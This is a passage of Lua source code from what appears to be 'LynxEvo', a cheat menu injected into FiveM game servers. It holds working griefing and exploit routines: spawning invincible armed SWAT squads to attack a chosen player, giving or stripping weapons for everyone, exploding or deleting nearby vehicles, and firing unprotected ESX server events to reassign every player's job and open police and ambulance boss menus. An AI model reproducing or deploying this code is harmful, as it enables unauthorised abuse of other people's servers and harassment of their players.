						TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
					elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
						TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
					else
						Citizen.Wait(0)
					end
				end
			end
		elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
			local pedname = "s_m_y_swat_01"
			local wep = "weapon_flaregun"
			for i = 0, 10 do
				local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
				RequestModel(GetHashKey(pedname))
				Citizen.Wait(50)
				if HasModelLoaded(GetHashKey(pedname)) then
					local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
					NetworkRegisterEntityAsNetworked(ped)
					if DoesEntityExist(ped) and
						not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
						local netped = PedToNet(ped)
						NetworkSetNetworkIdDynamic(netped, false) 
						SetNetworkIdCanMigrate(netped, true)
						SetNetworkIdExistsOnAllMachines(netped, true)
						Citizen.Wait(500)
						NetToPed(netped)
						GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
						SetEntityInvincible(ped, true)
						SetPedCanSwitchWeapon(ped, true)
						TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
					elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
						TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
					else
						Citizen.Wait(0)
					end
				end
			end
		elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
		local pedname = "s_m_y_swat_01"
		local wep = "weapon_railgun"
		for i = 0, 10 do
			local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
			RequestModel(GetHashKey(pedname))
			Citizen.Wait(50)
			if HasModelLoaded(GetHashKey(pedname)) then
				local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
				NetworkRegisterEntityAsNetworked(ped)
				if DoesEntityExist(ped) and
					not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
					local netped = PedToNet(ped)
					NetworkSetNetworkIdDynamic(netped, false) 
					SetNetworkIdCanMigrate(netped, true)
					SetNetworkIdExistsOnAllMachines(netped, true)
					Citizen.Wait(500)
					NetToPed(netped)
					GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
					SetEntityInvincible(ped, true)
					SetPedCanSwitchWeapon(ped, true)
					TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
				elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
					TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
				else
					Citizen.Wait(0)
				end
			end
		end
	end

	LynxEvo.Display()
	elseif IsDisabledControlPressed(0, 121) then
	if mhaonn then
		LynxEvo.OpenMenu("LynxX")
	else
		snake()
	end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("TeleportMenu") then
				if LynxEvo.Button("~h~Teleport to ~g~waypoint") then
					TeleportToWaypoint()
					elseif LynxEvo.Button("~h~Teleport into ~g~nearest ~s~vehicle") then
					teleporttonearestvehicle()
				elseif LynxEvo.Button("~h~Teleport to ~r~coords") then
					teleporttocoords()
				elseif LynxEvo.Button("~h~Draw custom ~r~blip ~s~on map") then
					drawcoords()
				elseif LynxEvo.CheckBox("~h~Show ~g~Coords", showCoords, function (enabled) showCoords = enabled end) then
			end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("WeaponMenu") then
			if LynxEvo.MenuButton("~h~~p~#~s~ Give Single Weapon", "WeaponTypes") then

			elseif LynxEvo.Button("~h~~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), 1000, false, false)
					end

				elseif LynxEvo.Button("~h~~r~Remove All Weapons") then
						RemoveAllPedWeapons(PlayerPedId(-1), true)

				elseif LynxEvo.Button("~h~Drop your current Weapon") then				
					local a = GetPlayerPed(-1)
					local b = GetSelectedPedWeapon(a)
					SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)

				elseif LynxEvo.Button("~h~~g~Give All Weapons to ~s~everyone") then
					for ids = 0, 128 do
						if ids ~= PlayerId(-1) and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(GetPlayerPed(ids), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
			end
				elseif LynxEvo.Button("~h~~r~Remove All Weapons from ~s~everyone") then
					for ids = 0, 128 do
						if ids ~= PlayerId(-1) and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								RemoveWeaponFromPed(GetPlayerPed(ids), GetHashKey(allWeapons[i]))
							end
						end
					end
				elseif LynxEvo.Button("~h~Give Ammo") then 
				for i = 1, #allWeapons do AddAmmoToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), 200) end
				elseif LynxEvo.CheckBox("~h~~r~OneShot Kill", oneshot, function(enabled) oneshot = enabled end) then
				elseif LynxEvo.CheckBox("~h~~r~No ~s~Reload", noreload, function(enabled) noreload = enabled end) then	
				elseif LynxEvo.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Flare Gun", rainbowf, function(enabled) rainbowf = enabled end) then
				elseif LynxEvo.CheckBox("~h~Vehicle Gun",VehicleGun, function(enabled)VehicleGun = enabled end)  then
				elseif LynxEvo.CheckBox("~h~Delete Gun",DeleteGun, function(enabled)DeleteGun = enabled end)  then
				end


				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("tunings") then
				veh = GetVehiclePedIsUsing(PlayerPedId())
				for i,theItem in pairs(vehicleMods) do
					if theItem.id == "extra" and #checkValidVehicleExtras() ~= 0 then
						if LynxEvo.MenuButton(theItem.name, theItem.id) then
						end
					elseif theItem.id == "neon" then
						if LynxEvo.MenuButton(theItem.name, theItem.id) then
						end
					elseif theItem.id == "paint" then
						if LynxEvo.MenuButton(theItem.name, theItem.id) then
						end
					elseif theItem.id == "wheeltypes" then
						if LynxEvo.MenuButton(theItem.name, theItem.id) then
						end
					elseif theItem.id == "headlight" then
						if LynxEvo.MenuButton(theItem.name, theItem.id) then
						end
					else
						local valid = checkValidVehicleMods(theItem.id)
						for ci,ctheItem in pairs(valid) do
							if LynxEvo.MenuButton(theItem.name, theItem.id) then
							end
							break
						end
					end
					
				end
				if IsToggleModOn(veh, 22) then
					xenonStatus = "Installed"
				else
					xenonStatus = "Not Installed"
				end
				if LynxEvo.Button("Xenon Headlight", xenonStatus) then
					if not IsToggleModOn(veh,22) then
						ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
					else
						ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
					end
				end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("performance") then
				veh = GetVehiclePedIsUsing(PlayerPedId())
				for i,theItem in pairs(perfMods) do
					if LynxEvo.MenuButton(theItem.name, theItem.id) then
					end
				end	
				if IsToggleModOn(veh,18) then
					turboStatus = "Installed"
				else
					turboStatus = "Not Installed"
				end
				if LynxEvo.Button("~h~~b~Turbo ~h~Tune", turboStatus) then
                    if not IsToggleModOn(veh,18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
                else 
                    ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
				end
			end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("primary") then
				LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic1")
				LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic1")
				LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte1")
				LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal1")
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("secondary") then
				LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic2")
				LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic2")
				LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte2")
				LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal2")
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("rimpaint") then
				LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic3")
				LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic3")
				LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte3")
				LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal3")
				
				LynxEvo.Display()			
			elseif LynxEvo.IsMenuOpened("classic1") then
				for theName,thePaint in pairs(paintsClassic) do
					tp,ts = GetVehicleColours(veh)
					if tp == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and tp == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							
							isPreviewing = true
						elseif isPreviewing and curprim == thePaint.id then
								SetVehicleColours(veh,thePaint.id,oldsec)
								SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and curprim ~= thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = true
						end
					end
				end
				
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("metallic1") then
				for theName,thePaint in pairs(paintsClassic) do
					tp,ts = GetVehicleColours(veh)
					if tp == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and tp == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							
							isPreviewing = true
						elseif isPreviewing and curprim == thePaint.id then
								SetVehicleColours(veh,thePaint.id,oldsec)
								SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and curprim ~= thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("matte1") then
				for theName,thePaint in pairs(paintsMatte) do
					tp,ts = GetVehicleColours(veh)
					if tp == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and tp == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleColours(veh,thePaint.id,oldsec)
							
							isPreviewing = true
						elseif isPreviewing and curprim == thePaint.id then
								SetVehicleColours(veh,thePaint.id,oldsec)
								SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and curprim ~= thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("metal1") then
				for theName,thePaint in pairs(paintsMetal) do
					tp,ts = GetVehicleColours(veh)
					if tp == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and tp == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							SetVehicleColours(veh,thePaint.id,oldsec)
							
							isPreviewing = true
						elseif isPreviewing and curprim == thePaint.id then
								SetVehicleColours(veh,thePaint.id,oldsec)
								SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and curprim ~= thePaint.id then
							SetVehicleColours(veh,thePaint.id,oldsec)
							SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("classic2") then
				for theName,thePaint in pairs(paintsClassic) do
					tp,ts = GetVehicleColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldmod = table.pack(oldprim,oldsec)
							SetVehicleColours(veh,oldprim,thePaint.id)
							
							isPreviewing = true
						elseif isPreviewing and cursec == thePaint.id then
								SetVehicleColours(veh,oldprim,thePaint.id)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and cursec ~= thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("metallic2") then 
				for theName,thePaint in pairs(paintsClassic) do
					tp,ts = GetVehicleColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldmod = table.pack(oldprim,oldsec)
							SetVehicleColours(veh,oldprim,thePaint.id)
							
							isPreviewing = true
						elseif isPreviewing and cursec == thePaint.id then
								SetVehicleColours(veh,oldprim,thePaint.id)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and cursec ~= thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("matte2") then 
				for theName,thePaint in pairs(paintsMatte) do
					tp,ts = GetVehicleColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldmod = table.pack(oldprim,oldsec)
							SetVehicleColours(veh,oldprim,thePaint.id)
							
							isPreviewing = true
						elseif isPreviewing and cursec == thePaint.id then
								SetVehicleColours(veh,oldprim,thePaint.id)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and cursec ~= thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("metal2") then
				for theName,thePaint in pairs(paintsMetal) do
					tp,ts = GetVehicleColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					curprim,cursec = GetVehicleColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldmod = table.pack(oldprim,oldsec)
							SetVehicleColours(veh,oldprim,thePaint.id)
							
							isPreviewing = true
						elseif isPreviewing and cursec == thePaint.id then
								SetVehicleColours(veh,oldprim,thePaint.id)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and cursec ~= thePaint.id then
							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = true
						end
					end
				end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("classic3") then
				for theName,thePaint in pairs(paintsClassic) do
					_,ts = GetVehicleExtraColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					_,currims = GetVehicleExtraColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							
							isPreviewing = true
						elseif isPreviewing and currims == thePaint.id then
								SetVehicleExtraColours(veh, oldpearl,thePaint.id)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and currims ~= thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("metallic3") then 
				for theName,thePaint in pairs(paintsClassic) do
					_,ts = GetVehicleExtraColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					_,currims = GetVehicleExtraColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							
							isPreviewing = true
						elseif isPreviewing and currims == thePaint.id then
								SetVehicleExtraColours(veh, oldpearl,thePaint.id)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and currims ~= thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("matte3") then 
				for theName,thePaint in pairs(paintsMatte) do
					_,ts = GetVehicleExtraColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					_,currims = GetVehicleExtraColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							
							isPreviewing = true
						elseif isPreviewing and currims == thePaint.id then
								SetVehicleExtraColours(veh, oldpearl,thePaint.id)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and currims ~= thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = true
						end
					end
				end
				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("metal3") then
				for theName,thePaint in pairs(paintsMetal) do
					_,ts = GetVehicleExtraColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					_,currims = GetVehicleExtraColours(veh)
					if LynxEvo.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							
							isPreviewing = true
						elseif isPreviewing and currims == thePaint.id then
								SetVehicleExtraColours(veh, oldpearl,thePaint.id)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
						elseif isPreviewing and currims ~= thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = true
						end
					end
				end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("VehicleMenu") then
				if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~b~LSC ~s~Customs", "LSC") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle ~g~Boost", 'BoostMenu') then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle List", 'CarTypes') then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Global Car Trolls", 'GCT') then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ Spawn & Attach ~s~Trailer", "MainTrailer") then
				elseif LynxEvo.Button("~h~Spawn ~r~Custom ~s~Vehicle") then
					spawnvehicle()
				elseif LynxEvo.Button("~h~~r~Delete ~s~Vehicle") then
					DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
				elseif LynxEvo.Button("~h~~g~Repair ~s~Vehicle") then
					repairvehicle()
				elseif LynxEvo.Button("~h~~g~Repair ~s~Engine") then
					repairengine()
				elseif LynxEvo.Button("~h~~g~Flip ~s~Vehicle") then
					daojosdinpatpemata()
				elseif LynxEvo.Button("~h~~b~Max ~s~Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
				elseif LynxEvo.Button("~h~~g~RC ~s~Car") then
					rccar()
					LynxEvo.CloseMenu()
				elseif LynxEvo.CheckBox("~h~No Fall", Nofall, function(enabled) Nofall = enabled SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall) end) then
				elseif LynxEvo.CheckBox("~h~Vehicle Godmode", VehGod, function(enabled) VehGod = enabled end)then
				elseif LynxEvo.CheckBox("~h~Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(enabled) VehSpeed = enabled end) then
			end

			LynxEvo.Display()
		elseif LynxEvo.IsMenuOpened("GCT") then
		if LynxEvo.CheckBox("~h~~r~EMP~s~ Nearest Vehicles", destroyvehicles, function(enabled) destroyvehicles = enabled end) then
		elseif LynxEvo.CheckBox("~h~~r~Delete~s~ Nearest Vehicles/Entity", deletenearestvehicle, function(enabled) deletenearestvehicle = enabled end) then
		elseif LynxEvo.CheckBox("~h~~r~Explode~s~ Nearest Vehicles", explodevehicles, function(enabled) explodevehicles = enabled end) then
		elseif LynxEvo.CheckBox("~h~~p~Fuck~s~ Nearest Vehicles", fuckallcars, function(enabled) fuckallcars = enabled end) then
		end
--------------------------
--LUA MENUS
		LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("LuaMenu") then
				if LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Boss", "ESXBoss") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Money", "ESXMoney") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Jobs", "ESXJobs") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Misc", "ESXCustom") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Drugs", "ESXDrugs") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ ~y~VRP ~s~Triggers", "VRPTriggers") then
				elseif LynxEvo.MenuButton("~h~~p~#~s~ ~b~Misc ~s~Triggers", "MiscTriggers") then
				end

				LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("ESXJobs") then
				if LynxEvo.Button("~h~Fire all players") then
					for a = 0, 128 do
						TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(a))
						UnemployedPlayers()
					end
				elseif LynxEvo.Button("~h~Set all ~b~Police ~s~Job") then
					for a = 0, 128 do
						TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(a), "police", 3)
						PolicePlayers()
					end
				elseif LynxEvo.Button("~h~Set all ~o~Mecano ~s~Job") then
					for a = 0, 128 do
						TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(a), "mecano", 3)
						MecanoPlayers()
					end
				elseif LynxEvo.Button("~h~Set all ~y~Taxi ~s~Job") then
					for a = 0, 128 do
						TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(a), "taxi", 3)
						TaxiPlayers()
					end
				elseif LynxEvo.Button("~h~Set all ~r~Ambulance ~s~Job") then
					for a = 0, 128 do
						TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(a), "ambulance", 3)
						AmbulancePlayers()
					end
				elseif LynxEvo.Button("~h~Set all ~g~Real Estate ~s~Job") then
					for a = 0, 128 do
						TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(a), "realestateagent", 3)
						RealEstateAgentPlayers()
					end
				elseif LynxEvo.Button("~h~Set all ~r~Car ~b~Dealer ~s~Job") then
					for a = 0, 128 do
						TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(a), "cardealer", 3)
						CarDealerPlayers()
					end
				end

			 LynxEvo.Display()
			elseif LynxEvo.IsMenuOpened("ESXBoss") then
				if LynxEvo.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu", 'mecano', function(data,menu) menu.close() end)
					TriggerEvent("esx_society:openBossMenu", "mecano", function(data,menu) menu.close() end)
					TriggerEvent("esx_society:openBossMenu", 'mecano', function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", "mecano", function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", 'mecano', function(data3,menu3) menu3.close() end)
					TriggerEvent("esx_society:openBossMenu", "mecano", function(data3,menu3) menu3.close() end)
					LynxEvo.CloseMenu()
				elseif LynxEvo.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu", 'police', function(data,menu) menu.close() end)
					TriggerEvent("esx_society:openBossMenu", "police", function(data,menu) menu.close() end)
					TriggerEvent("esx_society:openBossMenu", 'police', function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", "police", function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", 'police', function(data3,menu3) menu3.close() end)
					TriggerEvent("esx_society:openBossMenu", "police", function(data3,menu3) menu3.close() end)
					LynxEvo.CloseMenu()
				elseif LynxEvo.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu", 'ambulance', function(data,menu) menu.close() end)
					TriggerEvent("esx_society:openBossMenu", "ambulance", function(data,menu) menu.close() end)
					TriggerEvent("esx_society:openBossMenu", 'ambulance', function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", "ambulance", function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", 'ambulance', function(data3,menu3) menu3.close() end)
					TriggerEvent("esx_society:openBossMenu", "ambulance", function(data3,menu3) menu3.close() end)
					LynxEvo.CloseMenu()
				elseif LynxEvo.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu", 'taxi', function(data,menu) menu.close() end)
					TriggerEvent("esx_society:openBossMenu", "taxi", function(data,menu) menu.close() end)
					TriggerEvent("esx_society:openBossMenu", 'taxi', function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", "taxi", function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", 'taxi', function(data3,menu3) menu3.close() end)
					TriggerEvent("esx_society:openBossMenu", "taxi", function(data3,menu3) menu3.close() end)
					LynxEvo.CloseMenu()
				elseif LynxEvo.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(data,menu) LynxEvo.close() end)
					TriggerEvent("esx_society:openBossMenu", "realestateagent", function(data,menu) LynxEvo.close() end)
					TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(data2,menu2) menu2.close() end)
					TriggerEvent("esx_society:openBossMenu", "realestateagent", function(data2,menu2) menu2.close() end)
